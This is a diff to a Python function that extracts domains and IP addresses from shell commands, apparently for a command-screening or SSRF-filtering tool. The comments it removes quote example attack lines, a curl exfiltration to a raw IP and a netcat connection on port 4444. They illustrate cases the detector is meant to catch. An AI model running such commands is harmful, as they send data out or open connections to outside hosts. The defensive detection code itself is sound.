@@ -639,36 +639,28 @@ def _extract_binaries(command: str) -> list[str]:
 
 
 def _extract_domains(command: str) -> list[str]:
-    # FIX (Bug 4): Original regex only captured hostnames (letters in the URL host).
-    # Raw IP addresses like `curl http://1.2.3.4/exfil` were silently skipped because
-    # IPs have no alpha characters, so the `any(c.isalpha())` guard excluded them.
-    # Now we capture BOTH hostname and IP targets from URLs.
-
-    # Capture hostname/IP from http(s):// URLs — include digits-and-dots (IP addresses)
-    urls = re.findall(r'https?://([a-zA-Z0-9][a-zA-Z0-9.\-]*)', command)
+    urls = re.findall(r'https?://([a-zA-Z0-9\[\]][a-zA-Z0-9.\-:]*)', command)
     domains = []
     for host in urls:
+        host = host.replace("[", "").replace("]", "")
         domains.append(host.lower())
 
-    # Also detect bare IPv4 addresses used as targets (e.g. nc 1.2.3.4 4444)
     ip_pattern = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
     for match in ip_pattern.finditer(command):
         ip = match.group(1)
-        # Exclude obvious non-targets (localhost, 0.0.0.0 — already caught by SSRF rules)
         if ip not in ('127.0.0.1', '0.0.0.0', '255.255.255.255'):
             domains.append(ip)
 
-    # Bare domain words (no URL scheme)
     for word in command.split():
         word = word.strip().lower()
-        if "." in word and not any(c in word for c in "/:\\'\"()$*"):
-            if any(c.isalpha() for c in word):
-                domains.append(word)
-
+        word = re.sub(r'^https?://', '', word)
+        word = word.split('/')[0]
+        if "." in word or ":" in word or word.isdigit():
+            if not word.startswith('-') and not any(c in word for c in "'\"()$*<>|&;"):
+                clean = word.replace("[", "").replace("]", "")
+                if clean:
+                    domains.append(clean)
     return list(set(domains))
-
-
-
 
 def _domain_matches(domain: str, pattern: str) -> bool:
     pattern = pattern.lower()
